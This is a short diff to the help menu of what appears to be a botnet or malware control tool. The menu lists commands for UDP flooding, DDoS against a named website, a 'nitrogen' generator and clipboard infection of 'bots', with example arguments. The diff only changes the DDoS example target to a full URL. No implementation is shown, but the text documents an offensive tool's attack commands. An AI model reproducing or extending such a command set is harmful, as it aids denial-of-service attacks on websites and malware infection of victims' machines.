@@ -3,7 +3,7 @@
                                                 ║       COMMAND       ║
           ╔═════════════════════════════════════╩═════════════════════╩════════════════════════════════════╗
           ║     attack udp <ip> <port> <time> <thread>     ║     attack udp 127.0.0.1 80 60 100            ║
-          ║     ddos <ip> <thread> <time>                  ║     ddos cookiesservices.xyz 100 60           ║
+          ║     ddos <ip> <thread> <time>                  ║     ddos http://cookiesservices.xyz/ 100 60   ║
           ║     nitrogen <amount>                          ║     nitrogen 100                              ║
           ║     infectclipboard <botName> <url>            ║     Admin privileges required                 ║
           ║     stopinfectclipboard <botName>              ║     Admin privileges required                 ║  
